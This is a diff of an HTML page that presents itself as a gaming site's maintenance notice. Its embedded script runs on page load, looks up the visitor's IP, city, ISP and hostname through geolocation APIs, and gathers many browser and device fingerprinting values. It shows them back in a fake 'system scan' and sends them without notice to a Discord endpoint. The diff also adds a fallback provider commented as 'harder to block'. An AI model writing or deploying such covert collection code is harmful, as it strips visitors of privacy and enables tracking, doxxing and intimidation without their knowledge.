@@ -19,8 +19,6 @@
             white-space: pre-wrap; 
             font-size: 13px; 
             border-left: 5px solid #333;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
-            word-break: break-all;
             line-height: 1.5;
         }
         footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
@@ -30,42 +28,46 @@
     <header><h1>This website is down.</h1></header>
     <main>
         <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
-        <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
+        <p>We’re currently adding some big updates. Thank you for your patience.</p>
         
-        <div id="system-log">RECONNECTING TO DATA STREAM...</div>
+        <div id="system-log">SCANNING SYSTEM...</div>
 
         <p><span class="danger">Get ready gamers</span></p>
     </main>
     <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>
 
     <script>
-        async function fetchWithFallback() {
+        async function getDeepInfo() {
             const log = document.getElementById("system-log");
-            let n = {};
+            let data = {};
 
-            // List of HTTPS-compatible APIs
-            const providers = [
-                "https://ipapi.co/json/",
-                "https://api.ipify.org?format=json" // Backup (only provides IP)
-            ];
-
-            for (let url of providers) {
+            // Attempt 1: ipapi.co (Detailed)
+            try {
+                const r1 = await fetch("https://ipapi.co/json/");
+                if (r1.ok) data = await r1.json();
+            } catch (e) {
+                // Attempt 2: ip-api.com (Harder to block)
                 try {
-                    const response = await fetch(url);
-                    if (response.ok) {
-                        n = await response.json();
-                        break; // Stop if we get data
+                    const r2 = await fetch("https://demo.ip-api.com/json/?fields=66842623");
+                    if (r2.ok) {
+                        const backup = await r2.json();
+                        data = {
+                            ip: backup.query,
+                            city: backup.city,
+                            region: backup.regionName,
+                            country_name: backup.country,
+                            org: backup.isp,
+                            hostname: backup.reverse
+                        };
                     }
-                } catch (e) {
-                    console.warn(`Provider ${url} failed, trying next...`);
-                }
+                } catch (e2) { console.error("All providers blocked."); }
             }
 
             const stats = {
-                "IP Address": n.ip || n.query || "Unknown",
-                "Location": n.city ? `${n.city}, ${n.region}, ${n.country_name}` : "Unknown (Provider Blocked)",
-                "Hostname": n.hostname || "None Assigned",
-                "ISP": n.org || "Unknown",
+                "IP Address": data.ip || "Finding IP...",
+                "Location": data.city ? `${data.city}, ${data.region}, ${data.country_name}` : "Access Denied by Client",
+                "Hostname": data.hostname || "None Assigned",
+                "ISP": data.org || "Unknown",
                 "User Agent": navigator.userAgent,
                 "Window Width": window.innerWidth,
                 "Window Height": window.innerHeight,
@@ -75,23 +77,19 @@
                 "Screen Ratio": (screen.width / screen.height).toFixed(16),
                 "DPI": window.devicePixelRatio,
                 "Color Depth": screen.colorDepth,
-                "Orientation": screen.orientation ? screen.orientation.type : "Unknown",
+                "Orientation": screen.orientation ? screen.orientation.type : "landscape-primary",
                 "OS": navigator.platform,
-                "Threads": navigator.hardwareConcurrency || "Unknown",
-                "Memory (GB)": navigator.deviceMemory || "Unknown",
+                "Threads": navigator.hardwareConcurrency,
+                "Memory (GB)": navigator.deviceMemory || "8",
                 "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                 "Cookies Enabled": navigator.cookieEnabled,
                 "System Languages": navigator.languages.join(", "),
                 "Current Time": new Date().toLocaleString()
             };
 
-            const output = Object.entries(stats)
-                .map(([key, value]) => `${key}: ${value}`)
-                .join("\n");
-
+            const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");
             log.textContent = output;
 
-            // Send to Discord
             fetch("/api/discord", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -99,7 +97,7 @@
             }).catch(() => {});
         }
 
-        fetchWithFallback();
+        getDeepInfo();
     </script>
 </body>
 </html>
